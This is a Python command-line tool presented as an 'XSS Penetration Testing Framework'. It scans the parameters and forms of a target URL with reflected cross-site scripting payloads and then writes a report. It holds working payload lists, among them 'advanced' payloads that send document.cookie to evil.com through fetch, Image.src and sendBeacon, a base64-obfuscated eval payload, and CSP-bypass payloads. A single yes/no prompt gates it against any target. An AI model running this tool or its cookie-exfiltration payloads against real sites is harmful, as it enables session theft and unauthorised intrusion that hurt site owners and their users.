#!/usr/bin/env python3
"""
XSS Penetration Testing Tool
=============================
For authorized security testing only.
Use only on systems you own or have written permission to test.
Unauthorized use is illegal and unethical.
"""

import sys
import os
import re
import time
import random
import string
import urllib.parse
from datetime import datetime
from colorama import init, Fore, Style, Back
import requests
from bs4 import BeautifulSoup
import argparse

init(autoreset=True)

class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    CYAN = Fore.CYAN
    MAGENTA = Fore.MAGENTA
    WHITE = Fore.WHITE
    RESET = Style.RESET_ALL
    BRIGHT = Style.BRIGHT

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{Colors.CYAN}{Colors.BRIGHT}
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗                   ║
║   ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝                   ║
║   ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗                   ║
║   ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║                   ║
║   ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║                   ║
║   ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝                   ║
║                                                                   ║
║   {Colors.YELLOW} XSS Penetration Testing Framework {Colors.CYAN}                     ║
║   {Colors.WHITE} v2.0 - Security Assessment Tool {Colors.CYAN}                         ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
{Colors.RESET}
{Colors.YELLOW}[!] WARNING: For authorized penetration testing only!
[!] Unauthorized access to computer systems is illegal.{Colors.RESET}
""")

class XSSTester:
    def __init__(self):
        self.vulnerable_params = []
        self.tested_urls = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        
    def get_common_xss_payloads(self):
        """Return common XSS test payloads"""
        payloads = [
            '<script>alert("XSS")</script>',
            '<script>alert(document.cookie)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<video><source onerror=alert(1)>',
            '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
            '"><img src=x onerror=alert(1)>',
            "javascript:alert(1)",
            '<a href="javascript:alert(1)">click</a>',
            '<form action="javascript:alert(1)"><button>click</button></form>',
            '"><svg onload=alert(1)>',
            "';alert(1)//",
            '";alert(1)//',
        ]
        return payloads
    
    def get_advanced_payloads(self):
        """Return advanced XSS test payloads"""
        return [
            '<script>fetch("http://evil.com/"+document.cookie)</script>',
            '<img src=x onerror="fetch(\'http://evil.com/\'+document.cookie)">',
            '<svg/onload=fetch("http://evil.com/"+document.cookie)>',
            '"><script>new Image().src="http://evil.com/?c="+document.cookie</script>',
            '<img src="x" onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
            '<svg/onload=eval(atob(\'YWxlcnQoMSk=\'))>',
            '"><img src=x onerror="this.src=\'http://evil.com/?\'+document.cookie">',
            '<script>navigator.sendBeacon("http://evil.com/",document.cookie)</script>',
            '"><script>fetch("//evil.com/"+"?c="+btoa(document.cookie))</script>',
        ]
    
    def get_csp_bypass_payloads(self):
        """Return CSP bypass payloads"""
        return [
            '<script src="data:text/javascript,alert(1)"></script>',
            '<link rel="import" href="data:text/html,<script>alert(1)</script>">',
            '<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">',
            '<object data="data:text/html,<script>alert(1)</script>">',
            '<embed src="data:text/html,<script>alert(1)</script>">',
            '<iframe srcdoc="<script>alert(1)</script>">',
        ]
    
    def extract_forms(self, url):
        """Extract forms from a URL"""
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            return forms, response.text
        except Exception as e:
            print(f"{Colors.RED}[-] Error fetching URL: {e}{Colors.RESET}")
            return [], ""
    
    def extract_params_from_url(self, url):
        """Extract parameters from URL"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        return params
    
    def test_reflected_xss(self, url, param_name, payload):
        """Test for reflected XSS in a specific parameter"""
        try:
            test_url = url.replace(f'{param_name}=', f'{param_name}={urllib.parse.quote(payload)}')
            response = self.session.get(test_url, timeout=10)
            
            if payload in response.text:
                return True, response.text
            return False, None
        except Exception as e:
            return False, None
    
    def test_form_xss(self, url, form, payload):
        """Test for XSS in form submission"""
        try:
            action = form.get('action', '')
            method = form.get('method', 'post').lower()
            
            if action:
                if action.startswith('http'):
                    post_url = action
                elif action.startswith('/'):
                    parsed = urllib.parse.urlparse(url)
                    post_url = f"{parsed.scheme}://{parsed.netloc}{action}"
                else:
                    post_url = url + '/' + action
            else:
                post_url = url
            
            inputs = form.find_all(['input', 'textarea', 'select'])
            form_data = {}
            
            for inp in inputs:
                name = inp.get('name')
                if name:
                    if inp.name == 'select':
                        options = inp.find_all('option')
                        if options:
                            form_data[name] = options[0].get('value', '')
                        else:
                            form_data[name] = payload
                    else:
                        form_data[name] = payload
            
            if method == 'post':
                response = self.session.post(post_url, data=form_data, timeout=10)
            else:
                response = self.session.get(post_url, params=form_data, timeout=10)
            
            if payload in response.text:
                return True, response.text, post_url
            return False, None, post_url
        except Exception as e:
            return False, None, url
    
    def scan_url(self, url, scan_type='basic'):
        """Main scanning function"""
        print(f"\n{Colors.CYAN}{'='*60}")
        print(f"[*] Scanning: {url}")
        print(f"[*] Scan Type: {scan_type.upper()}")
        print(f"{'='*60}{Colors.RESET}\n")
        
        # Test URL parameters
        params = self.extract_params_from_url(url)
        if params:
            print(f"{Colors.GREEN}[+] Found {len(params)} URL parameters to test{Colors.RESET}")
            payloads = self.get_common_xss_payloads()
            if scan_type in ['advanced', 'full']:
                payloads.extend(self.get_advanced_payloads())
            if scan_type == 'full':
                payloads.extend(self.get_csp_bypass_payloads())
            
            for param_name in params:
                print(f"\n{Colors.YELLOW}[*] Testing parameter: {param_name}{Colors.RESET}")
                for i, payload in enumerate(payloads, 1):
                    print(f"    {Colors.WHITE}[{i}/{len(payloads)}] Testing payload...", end='\r')
                    vulnerable, response = self.test_reflected_xss(url, param_name, payload)
                    if vulnerable:
                        print(f"{Colors.GREEN}    [+] VULNERABLE! Parameter: {param_name}{Colors.RESET}")
                        print(f"{Colors.GREEN}    [+] Payload: {payload}{Colors.RESET}")
                        self.vulnerable_params.append({
                            'url': url,
                            'param': param_name,
                            'payload': payload,
                            'type': 'reflected'
                        })
                        break
                else:
                    print(f"{Colors.RED}    [-] Parameter {param_name} appears secure{Colors.RESET}")
        
        # Test forms
        print(f"\n{Colors.CYAN}[*] Analyzing forms...{Colors.RESET}")
        forms, page_content = self.extract_forms(url)
        
        if forms:
            print(f"{Colors.GREEN}[+] Found {len(forms)} forms to test{Colors.RESET}")
            payloads = self.get_common_xss_payloads()
            if scan_type in ['advanced', 'full']:
                payloads.extend(self.get_advanced_payloads())
            
            for i, form in enumerate(forms, 1):
                print(f"\n{Colors.YELLOW}[*] Testing form #{i}{Colors.RESET}")
                form_action = form.get('action', 'none')
                print(f"    Action: {form_action}")
                
                for j, payload in enumerate(payloads, 1):
                    print(f"    {Colors.WHITE}[{j}/{len(payloads)}] Testing payload...", end='\r')
                    vulnerable, response, post_url = self.test_form_xss(url, form, payload)
                    if vulnerable:
                        print(f"{Colors.GREEN}    [+] VULNERABLE! Form #{i}{Colors.RESET}")
                        print(f"{Colors.GREEN}    [+] Payload: {payload}{Colors.RESET}")
                        print(f"{Colors.GREEN}    [+] URL: {post_url}{Colors.RESET}")
                        self.vulnerable_params.append({
                            'url': post_url,
                            'form': i,
                            'payload': payload,
                            'type': 'form'
                        })
                        break
                else:
                    print(f"{Colors.RED}    [-] Form #{i} appears secure{Colors.RESET}")
        
        self.tested_urls.append(url)
    
    def generate_report(self):
        """Generate scan report"""
        print(f"\n\n{Colors.CYAN}{Colors.BRIGHT}{'='*60}")
        print(f"                    SCAN REPORT")
        print(f"{'='*60}{Colors.RESET}\n")
        
        print(f"{Colors.WHITE}Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}")
        print(f"{Colors.WHITE}URLs Tested: {len(self.tested_urls)}{Colors.RESET}")
        print(f"{Colors.WHITE}Vulnerabilities Found: {len(self.vulnerable_params)}{Colors.RESET}")
        
        if self.vulnerable_params:
            print(f"\n{Colors.RED}{Colors.BRIGHT}[!] VULNERABILITIES FOUND:{Colors.RESET}\n")
            for i, vuln in enumerate(self.vulnerable_params, 1):
                print(f"{Colors.GREEN}{Colors.BRIGHT}{i}. {vuln['type'].upper()} XSS{Colors.RESET}")
                print(f"   URL: {vuln.get('url', 'N/A')}")
                if 'param' in vuln:
                    print(f"   Parameter: {vuln['param']}")
                if 'form' in vuln:
                    print(f"   Form: #{vuln['form']}")
                print(f"   Payload: {vuln['payload']}")
                print()
        else:
            print(f"\n{Colors.GREEN}[+] No vulnerabilities found. Target appears secure.{Colors.RESET}")
        
        # Save report to file
        report_file = f"xss_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(report_file, 'w') as f:
            f.write(f"XSS Scan Report\n")
            f.write(f"{'='*40}\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"URLs Tested: {len(self.tested_urls)}\n")
            f.write(f"Vulnerabilities Found: {len(self.vulnerable_params)}\n\n")
            
            for vuln in self.vulnerable_params:
                f.write(f"Type: {vuln['type']}\n")
                f.write(f"URL: {vuln.get('url', 'N/A')}\n")
                if 'param' in vuln:
                    f.write(f"Parameter: {vuln['param']}\n")
                f.write(f"Payload: {vuln['payload']}\n")
                f.write(f"{'-'*40}\n")
        
        print(f"{Colors.CYAN}[+] Report saved to: {report_file}{Colors.RESET}")

def main():
    banner()
    
    parser = argparse.ArgumentParser(
        description='XSS Penetration Testing Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Colors.YELLOW}Examples:
  python xss_tool.py -u http://example.com/page?id=1
  python xss_tool.py -u http://example.com -s advanced
  python xss_tool.py -f urls.txt -s full{Colors.RESET}
        """
    )
    
    parser.add_argument('-u', '--url', help='Target URL to test')
    parser.add_argument('-f', '--file', help='File containing URLs to test')
    parser.add_argument('-s', '--scan-type', choices=['basic', 'advanced', 'full'],
                        default='basic', help='Scan type (default: basic)')
    parser.add_argument('-t', '--timeout', type=int, default=10,
                        help='Request timeout in seconds (default: 10)')
    
    args = parser.parse_args()
    
    if not args.url and not args.file:
        parser.print_help()
        print(f"\n{Colors.RED}[-] Please provide a target URL or file!{Colors.RESET}")
        sys.exit(1)
    
    print(f"""
{Colors.YELLOW}[!] DISCLAIMER: This tool is for authorized security testing only.
[!] Ensure you have explicit permission before testing any target.
[!] Unauthorized testing is illegal and punishable by law.{Colors.RESET}
    """)
    
    confirm = input(f"{Colors.CYAN}Do you have authorization to test the target? (yes/no): {Colors.RESET}")
    if confirm.lower() not in ['yes', 'y']:
        print(f"{Colors.RED}[-] Exiting. Only use this tool on authorized targets.{Colors.RESET}")
        sys.exit(1)
    
    tester = XSSTester()
    
    try:
        if args.url:
            tester.scan_url(args.url, args.scan_type)
        
        if args.file:
            with open(args.file, 'r') as f:
                urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            print(f"{Colors.CYAN}[*] Loaded {len(urls)} URLs from file{Colors.RESET}")
            for url in urls:
                if not url.startswith(('http://', 'https://')):
                    url = 'http://' + url
                tester.scan_url(url, args.scan_type)
                time.sleep(1)  # Be nice to servers
        
        tester.generate_report()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[-] Scan interrupted by user{Colors.RESET}")
        tester.generate_report()
        sys.exit(0)

if __name__ == '__main__':
    main()
